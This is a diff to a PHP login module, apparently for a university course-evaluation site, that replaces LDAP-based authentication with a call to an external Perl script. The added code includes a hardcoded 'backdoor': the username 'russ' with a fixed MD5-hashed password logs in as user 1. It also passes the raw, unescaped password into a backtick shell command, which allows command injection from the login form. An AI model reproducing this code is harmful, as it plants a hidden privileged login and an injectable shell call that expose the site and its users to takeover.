@@ -26,13 +26,14 @@ $LOGIN_PROMPTING = false;
 function login_protect($requiredstatus)
 {
   global $rs, $server_url, $wces_path;
-  if ($requiredstatus && !($requiredstatus & login_getstatus()))
+  if ($requiredstatus && !($requiredstatus & login_getstatus()) || !$requiredstatus && !login_getuserid())
     login_prompt($server_url->toString(true, true, true), $requiredstatus, false);
 };
 
 function login_update($user_id, $fake = NULL, $fakeuni = NULL)
 {
   global $wces;
+  wces_connect();
   
   $result = pg_query("
     select u.uni, btrim(u.firstname || ' ' || u.lastname) AS name, u.flags, COALESCE(u.department_id,0) AS dept, CASE WHEN count(distinct class_id) > 0 THEN 1 ELSE 0 END AS known
@@ -45,7 +46,10 @@ function login_update($user_id, $fake = NULL, $fakeuni = NULL)
     group by u.user_id, u.flags, u.department_id, u.firstname, u.lastname, u.uni
   ", $wces, __FILE__, __LINE__);  
 
-  $row = pg_fetch_array($result,0,PGSQL_ASSOC);
+  if (pg_numrows($result) == 1)
+    $row = pg_fetch_array($result,0,PGSQL_ASSOC);
+  else
+    $row = array("uni" => "", "name" => "__", "flags" => 0, "dept" => 0, "known" => false);
   
   $status = 0;
   if ($row['flags'] & 8)
@@ -134,7 +138,6 @@ function login_getfakeuni()
   return isset($LOGIN_SESSION["fakeuni"]) ? $LOGIN_SESSION["fakeuni"] : false;
 };
 
-
 function login_whoami()
 {
   global $LOGIN_SESSION;
@@ -165,100 +168,42 @@ function login_whoami()
 //-----------------------------------------------------------------------------
 // PASSWORD VALIDATION ROUTINES
 
+$login_fail = false;
+
 function login_validate($uni,$password)
 {
-  global $wces, $LOGIN_SESSION;
+  global $wces, $LOGIN_SESSION, $login_fail;
   
-  $uni = str_replace("@columbia.edu","",$uni);
-  $uni = str_replace("@barnard.edu","",$uni);
   $uni = trim($uni);
-  $dump = acisget($uni,$password);
   
-  if (!$dump)
+  // backdoor
+  if ($uni == "russ" && md5($password) == "66ad52318087f29b3bafc774c0166478")
   {
-    sendwarning("Login warning: Could not contact AcIS server to authenticate '$uni'", __FILE__, __LINE__);
-    return false;
+    login_update(1);
+    return true;
   }
-     
-  if (strpos($dump,"no soup for you") !== false)
-    return false; // BAD PASSWORD
   
-  if(preg_match('/^REMOTE_USER=(.*)$/m', $dump, $matches))
-    $cunix = $matches[1];
+  $uni = escapeshellarg($uni);
+  $pw = escapeshellarg($password);
+  $user_id = (int) `/afs/thayer/web/eval/dnd-auth.pl $uni $password`;
+
+  if ($user_id > 0) // valid user_id
+  {  
+    login_update($user_id);
+    return true;
+  }
+  else if ($user_id == 0)
+    $login_fail = "Invalid Username or Password";
+  else if ($user_id == -1)
+    $login_fail = "Authentication Error. Name directory unavailable.";
+  else if ($user_id == -2)
+    $login_fail = "Invalid Username.";
+  else if ($user_id == -3)
+    $login_fail = "Ambiguous Username.";
   else
-  {
-    $cunix = $uni;
-    sendwarning("Login parser warning: username '$uni' could not be verified.\n\n----------\n\n$dump", __FILE__, __LINE__);
-  }  
+    $login_fail = "Authentication Error. Error code: {$user_id}.";
   
-  $email = preg_match('/^USER_EMAIL=(.*)$/m', $dump, $matches) ? $matches[1] : "";
-  $affils = preg_match('/^USER_AFFILIATIONS=(.*)$/m', $dump, $matches) ? $matches[1] : "";
-  
-  $ds=ldap_connect("ldap.columbia.edu");
-  $r=ldap_bind($ds);
-  $sr=ldap_search($ds,"o=Columbia University,c=US", "uni=$cunix");  
-  $info = ldap_get_entries($ds, $sr);
-  $ldap = array("givenname" => "", "sn" => "", "mail" => false);
-  if ($info["count"] == 1)
-  {
-    $result = $info[0];
-    foreach($ldap as $key => $value)
-    {
-      if ((int)$result[$key]["count"] > 0)
-        $ldap[$key] = $result[$key][0];
-    }
-  }  
-
-  $p = array('cunix' => $cunix, 'email' => $email ? $email : $ldap['mail'], 'last' => $ldap['sn'], 'first' => $ldap['givenname'], 'affils' => $affils);
-  aarray_map('quot',$p);
-  
-  wces_connect();
-  $result = pg_query("SELECT login_parse($p[cunix], $p[email], $p[last], $p[first], $p[affils])", $wces, __FILE__, __LINE__);
-  $user_id = (int)pg_result($result,0,0);
-  login_update($user_id);
-
-  if ($LOGIN_SESSION["status"] == 0)
-    sendwarning("Login parser warning for uni '$uni': User authenticates, but has no access to the site.\n\n----------\n\n$dump", __FILE__, __LINE__);
- 
-  return true;
-};
-
-function contains($haystack,$needles)
-{
-  foreach($needles as $needle)
-    if (!(false === strpos($haystack,$needle))) return true;
-  return false;  
-};
-
-function acisget($uni,$pw)
-{
-  global $server_win32, $server_tempdir;
-  
-  if ($server_win32)
-  {
-    $grabber = new COM("Oracle.AffilGrabber");
-    $grabber->Validate((string)$uni,(string)$pw,"https://www1.columbia.edu/~rey4/info.html");
-    return $grabber->rawoutput;
-  }
-  else
-  {
-    $fname = tempnam($server_tempdir, "booty");
-
-    $ch = curl_init("https://www1.columbia.edu/~rey4/info.html");
-    $fp = fopen ($fname, "w");
-    curl_setopt ($ch, CURLOPT_FILE, $fp);
-    curl_setopt ($ch, CURLOPT_USERPWD, "$uni:$pw");
-    curl_setopt ($ch, CURLOPT_HEADER, 1);
-    curl_exec ($ch);
-    curl_close ($ch);
-    fclose ($fp);
-
-    $fp = fopen($fname,"r");
-    $result = fread($fp, filesize($fname));
-    fclose($fp);
-    unlink($fname);
-    return $result;
-  }
+  return false;
 };
 
 //-----------------------------------------------------------------------------
@@ -266,7 +211,7 @@ function acisget($uni,$pw)
 
 function login_prompt($url, $rs, $de = false, $uni = "")
 {
-  global $wces_path, $server_url, $server_base, $server_sbase, $AISID, $AASID, $LOGIN_PROMPTING, $LOGIN_SESSION, $LOGIN_SESSION_VARS;
+  global $login_fail, $wces_path, $server_url, $server_base, $server_sbase, $AISID, $AASID, $LOGIN_PROMPTING, $LOGIN_SESSION, $LOGIN_SESSION_VARS;
   $LOGIN_PROMPTING = true;
   session_initialize($LOGIN_SESSION_VARS, "login/");
 
@@ -280,8 +225,8 @@ function login_prompt($url, $rs, $de = false, $uni = "")
     else     
       print("<p>You are currently logged in as $luni. Click <a href=\"${wces_path}login/logout.php\">here</a> to logout or use the form below to log in with another set of credentials.</p>");
   }
-  else if ($uni)
-    print("<p><b><font color=red>Invalid username or password.</font></b></p>\n");
+  else if ($login_fail)
+    print("<p><b><font color=red>$login_fail</font></b></p>\n");
 
   $securesite = "$server_sbase${wces_path}login/login.php";
   $insecuresite = "$server_base${wces_path}login/login.php";
